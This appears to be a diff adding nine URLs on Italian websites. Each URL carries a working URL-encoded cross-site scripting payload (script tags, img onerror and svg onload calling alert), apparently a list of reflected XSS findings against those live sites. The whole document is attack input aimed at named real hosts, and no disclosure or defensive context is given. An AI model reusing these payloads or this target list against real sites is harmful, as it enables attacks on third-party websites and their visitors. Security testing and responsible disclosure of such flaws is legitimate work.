@@ -1,0 +1,9 @@
+http://bogenservice.it?lang=%22%3E%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E%3Cp%20class=%22&p=1
+http://bolognacolors.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+http://brianzatendegarlate.it/wp-admin/admin.php/%3C%2Fscript%3E%3Cscript%3Ealert%28document.domain%29%3C%2Fscript%3E/?page=under-construction
+http://cattolicadeigreci.it/jolokia/read%3Csvg%20onload=alert%28document.domain%29%3E?mimeType=text/html
+http://cdn02.stardata.it/cgi-bin/manlist?section=%22%3E%3Ch1%3Ehello%3C%2Fh1%3E%3Cscript%3Ealert(/2OKNHSA6wnWmT4JxJUM9oEaZIgb/)%3C%2Fscript%3E
+http://cdn03.imgr.it/calendar_form.php/%22%3E%3Cscript%3Ealert%28document.domain%29%3C/script%3E
+http://centrim.it/query/%3Cimg%20src=x%20onerror=alert(document.domain)%3E/all
+https://cdn03.stardata.it/does_not_exist%22%22%3E%3Cscript%3Ealert%28%22XSS%22%29%3C/script%3E%3Cimg%20src=x
+https://cdn.imgr.it/message?msg=%26%23%3Csvg/onload=alert(1337)%3E&title=x
